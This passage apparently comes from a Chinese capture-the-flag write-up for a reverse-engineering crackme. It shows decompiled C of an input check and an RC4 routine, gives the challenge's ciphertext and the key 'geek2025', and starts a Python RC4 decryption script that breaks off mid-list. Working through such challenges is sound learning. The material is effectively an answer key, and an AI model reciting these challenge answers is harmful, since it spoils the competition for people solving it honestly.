</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">cleanup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-238h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-234h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-230h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-22Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+28h] [rbp-218h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-210h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [rsp+130h] [rbp-110h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+238h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">v1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="o">--</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">validate_input_length</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">global_nodes</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">validate_key</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dest</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">compute_checksum</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">8LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">sub_44656</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">4LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">reverse_call</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">28</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">28</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">dest</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">result</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="o">||</span> <span class="n">v5</span> <span class="o">!=</span> <span class="n">v6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Great!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">secure_memset</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v10</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_44656</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-218h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-214h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-214h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v13</span><span class="p">[</span><span class="mi">520</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-210h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+238h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v14</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">%</span> <span class="n">a4</span> <span class="o">+</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">256</span><span class="p">]</span> <span class="o">+</span> <span class="n">v8</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v8</span><span class="p">]</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">v9</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">k</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">^=</span> <span class="n">v13</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">v13</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">+</span> <span class="n">v13</span><span class="p">[</span><span class="n">v9</span><span class="p">])];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v14</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">init_node</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="mi">16LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v1</span> <span class="o">=</span> <span class="mi">16LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1LL</span><span class="p">)</span> <span class="o">+</span> <span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>是个RC4,从result处可以读到密文</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x52, 0x59, 0xF3, 0x8A, 0x00, 0x0F, 0xE6, 0x56, 0x36, 0xE5, 0xF0, 0x33, 0x40, 0x6E, 0x56, 0x81, 0x5A, 0xE5, 0x6F, 0x87, 0x6F, 0x9F, 0x21, 0xC9, 0xA6, 0xBB, 0x16, 0x51
</span></span></code></pre></td></tr></table>
</div>
</div><p>key在arr,是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">geek2025
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接解rc4</p>
<h4 id="exp-14">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># RC4</span>
</span></span><span class="line"><span class="cl">    <span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span>
